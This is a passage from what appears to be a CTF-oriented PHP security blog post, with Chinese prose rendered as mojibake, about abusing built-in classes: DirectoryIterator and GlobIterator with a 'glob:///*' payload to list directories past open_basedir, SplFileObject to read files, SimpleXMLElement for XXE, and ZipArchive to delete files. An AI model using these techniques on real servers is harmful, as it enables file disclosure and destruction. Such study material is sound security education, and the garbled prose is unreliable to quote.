<p>æ‰§è¡Œå®Œæˆååªè¦å¸¦ä¸Šä¹‹å‰ä¿å­˜çš„Cookieå»è®¿é—®é¡µé¢å°±èƒ½è·å¾—flag</p>
<p><img src="https://gitee.com/shark-rice/images/raw/master/202307250049224.png" alt="image-20230719150301629"></p>
<p>è¿™é‡Œæˆ‘åœ¨ä¸€å¼€å§‹åšé¢˜æ—¶åˆåäº†æ¯›ç—…ï¼Œå°±æ˜¯å†™åºåˆ—åŒ–æ•°æ®åœ¨sessionå¤„å¿˜äº†å¸¦ä¸Šäº†PHPSESSID</p>
<h3 id="DirectoryIterator-ç±»"><a href="#DirectoryIterator-ç±»" class="headerlink" title="DirectoryIterator ç±»"></a>DirectoryIterator ç±»</h3><p>Directorylteratorç±»å±äºPHPçš„åŸç”Ÿæ–‡ä»¶æ“ä½œç±»</p>
<p>Directorylteratorç±»æä¾›äº†ä¸€ä¸ªæŸ¥çœ‹æ–‡ä»¶ç³»ç»Ÿç›®å½•çš„ç®€å•æ¥å£ï¼Œæ˜¯PHP5çš„ä¸€ä¸ªæ–°å¢ç±»ã€‚</p>
<p><strong>Directorylteratorä¸glob:&#x2F;&#x2F;åè®®ç»“åˆå¯ä»¥æ— è§†open_basedirå¯¹ç›®å½•çš„é™åˆ¶</strong>ï¼Œå¯ä»¥ç”¨æ¥åˆ—ä¸¾å‡ºæŒ‡å®šç›®å½•ä¸‹çš„æ–‡ä»¶ã€‚</p>
<p>æµ‹è¯•ä»£ç </p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php">&#x2F;&#x2F; test.php
&lt;?php
$dir &#x3D; $_GET[&#39;whoami&#39;];
$a &#x3D; new DirectoryIterator($dir);
foreach($a as $f)&#123;
    echo($f-&gt;__toString().&#39;&lt;br&gt;&#39;);&#x2F;&#x2F;å¦‚æœæƒ³è¾“å‡ºå…¨éƒ¨çš„æ–‡ä»¶åæˆ‘ä»¬è¿˜éœ€è¦å¯¹$dirå¯¹è±¡è¿›è¡Œéå†
&#125;
?&gt;&lt;?php
$dir &#x3D; $_GET[&#39;whoami&#39;];
$a &#x3D; new DirectoryIterator($dir);
foreach($a as $f)&#123;
    echo($f-&gt;__toString().&#39;&lt;br&gt;&#39;);&#x2F;&#x2F;å¦‚æœæƒ³è¾“å‡ºå…¨éƒ¨çš„æ–‡ä»¶åæˆ‘ä»¬è¿˜éœ€è¦å¯¹$dirå¯¹è±¡è¿›è¡Œéå†
&#125;
?&gt;</code></pre>

<p>payload</p>
<pre class="line-numbers language-none"><code class="language-none">?whoami&#x3D;glob:&#x2F;&#x2F;&#x2F;*</code></pre>

<p>å¯ä»¥çœ‹åˆ°è®¿é—®äº†phpstudyæ‰€åœ¨ç›˜ä¸‹æ ¹ç›®å½•æ‰€æœ‰æ–‡ä»¶</p>
<p><img src="https://gitee.com/shark-rice/images/raw/master/202307250049096.png" alt="image-20230719162032861"></p>
<blockquote>
<p>ä½†æ˜¯ä¼šå‘ç°åªèƒ½åˆ—æ ¹ç›®å½•å’Œopen_basediræŒ‡å®šçš„ç›®å½•çš„æ–‡ä»¶ï¼Œä¸èƒ½åˆ—å‡ºé™¤å‰é¢çš„ç›®å½•ä»¥å¤–çš„ç›®å½•ä¸­çš„æ–‡ä»¶ï¼Œä¸”ä¸èƒ½è¯»å–æ–‡ä»¶å†…å®¹ã€‚</p>
</blockquote>
<p>globåè®®é€‚ç”¨é€šé…ç¬¦æŸ¥è¯¢</p>
<p><img src="https://gitee.com/shark-rice/images/raw/master/202307250049258.png" alt="image-20230719162433774"></p>
<p>å…¶ä»–æ–‡ä»¶æ“ä½œç±»</p>
<p>FilesystemIterator ç±»<br>FilesystemIterator ç±»ä¸ DirectoryIterator ç±»ç›¸åŒï¼Œæä¾›äº†ä¸€ä¸ªç”¨äºæŸ¥çœ‹æ–‡ä»¶ç³»ç»Ÿç›®å½•å†…å®¹çš„ç®€å•æ¥å£ã€‚è¯¥ç±»çš„æ„é€ æ–¹æ³•å°†ä¼šåˆ›å»ºä¸€ä¸ªæŒ‡å®šç›®å½•çš„è¿­ä»£å™¨ã€‚</p>
<p>è¯¥ç±»çš„ä½¿ç”¨æ–¹æ³•ä¸DirectoryIterator ç±»ä¹Ÿæ˜¯åŸºæœ¬ç›¸åŒçš„ï¼š</p>
<pre class="line-numbers language-none"><code class="language-none">&lt;?php
$dir&#x3D;new FilesystemIterator(&quot;&#x2F;&quot;);
echo $dir;</code></pre>



<pre class="line-numbers language-none"><code class="language-none">&lt;?php
$dir&#x3D;new FilesystemIterator(&quot;&#x2F;&quot;);
foreach($dir as $f)&#123;
    echo($f.&#39;&lt;br&gt;&#39;);
    &#x2F;&#x2F;echo($f-&gt;__toString().&#39;&lt;br&gt;&#39;);
&#125;</code></pre>



<pre class="line-numbers language-none"><code class="language-none">&lt;?php
$dir&#x3D;new FilesystemIterator(&quot;glob:&#x2F;&#x2F;&#x2F;*php*&quot;);
echo $dir;</code></pre>



<p>GlobIterator ç±»</p>
<p>ç”±äºä½¿ç”¨ GlobIterator ç±»æ”¯æŒç›´æ¥é€šè¿‡æ¨¡å¼åŒ¹é…æ¥å¯»æ‰¾æ–‡ä»¶è·¯å¾„ï¼Œæ‰€ä»¥æˆ‘ä»¬å°±ä¸ç”¨åœ¨é…åˆglob:&#x2F;&#x2F;åè®®äº†ã€‚</p>
<p>æµ‹è¯•ä»£ç ï¼š</p>
<pre class="line-numbers language-none"><code class="language-none">ä»£ç ï¼š

&lt;?php
$dir &#x3D; $_GET[&#39;whoami&#39;];
$a &#x3D; new GlobIterator($dir);
foreach($a as $f)&#123;
    echo($f-&gt;__toString().&#39;&lt;br&gt;&#39;);&#x2F;&#x2F; ä¸åŠ __toString()ä¹Ÿå¯,å› ä¸ºechoå¯ä»¥è‡ªåŠ¨è°ƒç”¨
&#125;
?&gt;

# payloadä¸€å¥è¯çš„å½¢å¼:
$a &#x3D; new FilesystemIterator(&quot;&#x2F;*&quot;);foreach($a as $f)&#123;echo($f-&gt;__toString().&#39;&lt;br&gt;&#39;);&#125;</code></pre>

<h4 id="å¯è¯»å–æ–‡ä»¶å†…å®¹ç±»"><a href="#å¯è¯»å–æ–‡ä»¶å†…å®¹ç±»" class="headerlink" title="å¯è¯»å–æ–‡ä»¶å†…å®¹ç±»"></a>å¯è¯»å–æ–‡ä»¶å†…å®¹ç±»</h4><p>plFileInfo ç±»ä¸ºå•ä¸ªæ–‡ä»¶çš„ä¿¡æ¯æä¾›äº†ä¸€ä¸ªé«˜çº§çš„é¢å‘å¯¹è±¡çš„æ¥å£ï¼Œå¯ä»¥ç”¨äºå¯¹æ–‡ä»¶å†…å®¹çš„éå†ã€æŸ¥æ‰¾ã€æ“ä½œç­‰ã€‚</p>
<p>è¯¥ç±»çš„æ„é€ æ–¹æ³•å¯ä»¥æ„é€ ä¸€ä¸ªæ–°çš„æ–‡ä»¶å¯¹è±¡ç”¨äºåç»­çš„è¯»å–ã€‚</p>
<p>æˆ‘ä»¬å¯ä»¥åƒç±»ä¼¼ä¸‹é¢è¿™æ ·å»è¯»å–ä¸€ä¸ªæ–‡ä»¶çš„ä¸€è¡Œï¼š</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?php
$context &#x3D; new SplFileObject(&#39;&#x2F;cachegrind.out.1004&#39;);
echo $context;</code></pre>

<p>ä½†æ˜¯è¿™æ ·ä¹Ÿåªèƒ½è¯»å–ä¸€è¡Œï¼Œè¦æƒ³å…¨éƒ¨è¯»å–çš„è¯è¿˜éœ€è¦å¯¹æ–‡ä»¶ä¸­çš„æ¯ä¸€è¡Œå†…å®¹è¿›è¡Œéå†ï¼š</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?php
$context &#x3D; new SplFileObject(&#39;&#x2F;cachegrind.out.1004&#39;);
foreach($context as $f)&#123;
    echo($f);
&#125;</code></pre>



<h3 id="SimpleXMLElementç±»"><a href="#SimpleXMLElementç±»" class="headerlink" title="SimpleXMLElementç±»"></a>SimpleXMLElementç±»</h3><p>SimpleXMLElementè¿™ä¸ªå†…ç½®ç±»ç”¨äºè§£æXMLæ–‡æ¡£ä¸­çš„å…ƒç´ </p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php">public SimpleXMLElement::__construct(
    string $data,
    int $options &#x3D; 0,
    bool $dataIsURL &#x3D; false,
    string $namespaceOrPrefix &#x3D; &quot;&quot;,
    bool $isPrefix &#x3D; false
)</code></pre>

<p><img src="/PHP%E5%8E%9F%E7%94%9F%E7%B1%BB%E7%9B%B8%E5%85%B3%E5%88%A9%E7%94%A8.assets/20210329180252-eccb96c2-9075-1.png"></p>
<p>è¿™é‡Œæ¯”è¾ƒé‡è¦çš„æ˜¯ç¬¬ä¸‰ä¸ªå‚æ•°ï¼Œå¦‚æœ<code>data_is_url</code>è®¾ç½®ä¸º<code>true</code>é‚£ä¹ˆå¯ä»¥å®ç°è¿œç¨‹xmlæ–‡ä»¶çš„è½½å…¥ã€‚ç¬¬äºŒä¸ªå‚æ•°ä¸€èˆ¬è®¾ç½®ä¸º2ã€‚ç¬¬ä¸€ä¸ªå‚æ•°dataå¯ä»¥è®¾ç½®ä¸ºpayliadçš„urlåœ°å€ç”¨äºè¿›å…¥å¤–éƒ¨å®ä½“urlã€‚æˆ–è€…xmlæ–‡æ¡£å­—ç¬¦ä¸²ä¹Ÿå¯ä»¥ã€‚</p>
<p>è¿™æ ·çš„è¯ï¼Œå½“æˆ‘ä»¬å¯ä»¥æ§åˆ¶ç›®æ ‡è°ƒç”¨çš„ç±»çš„æ—¶å€™ï¼Œä¾¿å¯ä»¥é€šè¿‡ SimpleXMLElement è¿™ä¸ªå†…ç½®ç±»æ¥æ„é€  XXEã€‚</p>
<h3 id="ZipArchive-ç±»"><a href="#ZipArchive-ç±»" class="headerlink" title="ZipArchive ç±»"></a>ZipArchive ç±»</h3><p>PHP ZipArchiveç±»æ˜¯PHPçš„ä¸€ä¸ªåŸç”Ÿç±»ï¼Œå®ƒæ˜¯åœ¨PHP 5.20ä¹‹åå¼•å…¥çš„ã€‚ZipArchiveç±»å¯ä»¥å¯¹æ–‡ä»¶è¿›è¡Œå‹ç¼©ä¸è§£å‹ç¼©å¤„ç†</p>
<p><img src="https://gitee.com/shark-rice/images/raw/master/202307250049636.png" alt="image-20230725004824174"></p>
<p>æ³¨æ„ï¼Œå¦‚æœè®¾ç½®flagså‚æ•°çš„å€¼ä¸º ZipArchive::OVERWRITE çš„è¯ï¼Œå¯ä»¥æŠŠæŒ‡å®šæ–‡ä»¶åˆ é™¤ã€‚è¿™é‡Œæˆ‘ä»¬è·Ÿè¿›æ–¹æ³•å¯ä»¥çœ‹åˆ°const OVERWRITE &#x3D; 8ï¼Œä¹Ÿå°±æ˜¯å°†OVERWRITEå®šä¹‰ä¸ºäº†å¸¸é‡8ï¼Œæˆ‘ä»¬åœ¨è°ƒç”¨æ—¶ä¹Ÿå¯ä»¥ç›´æ¥å°†flagsèµ‹å€¼ä¸º8ã€‚</p>

    </div>
</article>

<script src="/js/codeblock.js"></script>
<!--æ˜¾ç¤ºæ–‡ç« é¡µç›¸å…³å†…å®¹-->
            <!--bodyæ˜¯ä¸€ä¸ªå˜é‡ï¼Œä»£è¡¨é¡µé¢çš„ä¸»è¦å†…å®¹ã€‚åœ¨æ¸²æŸ“æ¨¡æ¿æ—¶ï¼Œè¿™ä¸ªå˜é‡ä¼šè¢«æ›¿æ¢ä¸ºå®é™…çš„å†…å®¹ã€‚-->
            

            <div style="border-bottom:1px solid #eaedf3;"></div>

            <footer class="footer">
    <p>s4mmy &copy; 2025&nbsp;| &nbsp;Recorded for better expressionğŸ§¡&nbsp;|
        <a href="https://github.com/s4mmyyy/hexo-theme-life" target="_blank" class="theme">&nbsp;Theme</a>
    
    </p>
</footer>
        </div>
        
    </body>
</html>